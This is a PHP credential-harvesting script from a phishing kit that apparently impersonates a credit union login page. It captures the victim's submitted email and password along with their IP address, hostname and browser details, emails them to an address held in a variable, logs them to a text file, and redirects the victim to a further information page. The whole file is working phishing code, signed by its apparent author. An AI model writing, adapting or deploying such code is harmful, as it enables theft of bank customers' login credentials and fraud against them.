<?php

session_start();
include ('./bug.php');
$userid = $_POST['UserName'];
$password = $_POST['Password'];
$ip = getenv("REMOTE_ADDR");
$useragent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
	
	
	
	$message .= "|------------| -ALaskFCU- |--------------|\n";
	$message .= "    -----------o0o^v^o0o---------     \n";
	$message .= "|Email           : ".$userid."\n";
	$message .= "|Password        : ".$password."\n";
	$message .= "    -----------o0o^v^o0o---------\n";
	$message .= "|--------- I N F O X I P ---------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|         --- Host Details ----       \n";
	$message .= "|Client Host : ".$hostname."\n";
	$message .= "|User Agent : ".$useragent."\n";
	$message .= "|----------- Forged By d3ng3 --------------|\n";
	$send = $set;
	$subject = "ALaska Log : $hostname";
    mail($send, $subject, $message);   

    $tds = fopen("AL.txt","a");
 fputs($tds,$message);
 fclose($tds);
  header("Location: ./Information.php?=$hostname&src-secure=3944855kdhhdjdjhu38u3hdjhzzzhhddjhjejhjfjhfjf");


?>